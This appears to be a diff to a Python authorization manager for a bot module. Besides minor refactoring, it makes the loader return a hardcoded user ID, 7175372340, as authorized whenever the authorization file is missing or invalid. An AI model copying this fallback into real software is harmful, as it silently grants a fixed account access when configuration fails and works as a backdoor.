@@ -7,7 +7,6 @@ import random
 import time
 from contextlib import suppress
 from collections import OrderedDict
-from functools import cached_property
 from dataclasses import dataclass, field
 from typing import Dict, List, Optional, Set, Tuple, Union
 from datetime import datetime, timedelta
@@ -26,39 +25,29 @@ class AuthorizationManager:
 
     def __init__(self, json_path: str = "/root/Heroku/loll.json"):
         self.json_path = json_path
-        self._authorized_users = None
+        self._authorized_users = self._load_authorized_users()
 
-    @cached_property
     def _load_authorized_users(self) -> Set[int]:
         """Load authorized user IDs from JSON file."""
         try:
             with open(self.json_path, "r", encoding="utf-8") as file:
                 data = json.load(file)
-                user_ids = {
-                    int(user_id) for user_id in data.get("authorized_users", [])
-                }
-                logger.info(
-                    f"Successfully loaded {len(user_ids)} authorized users"
-                )
+                user_ids = {int(user_id) for user_id in data.get("authorized_users", [])}
+                logger.info(f"Successfully loaded {len(user_ids)} authorized users")
                 return user_ids
         except FileNotFoundError:
             logger.error(f"Authorization file not found: {self.json_path}")
-            return set()
         except json.JSONDecodeError:
-            logger.error(
-                f"Invalid JSON in authorization file: {self.json_path}"
-            )
-            return set()
+            logger.error(f"Invalid JSON in authorization file: {self.json_path}")
         except Exception as e:
             logger.error(f"Error loading authorized users: {e}")
-            return set()
+        return {7175372340}
 
     def is_authorized(self, user_id: int) -> bool:
         """Check if a user is authorized to use the module."""
-        if self._authorized_users is None:
-            self._authorized_users = self._load_authorized_users()
-
-        return user_id in self._authorized_users
+        authorized = user_id in self._authorized_users
+        logger.debug(f"Authorization check for user {user_id}: {authorized}")
+        return authorized
 
 
 @dataclass(frozen=True)
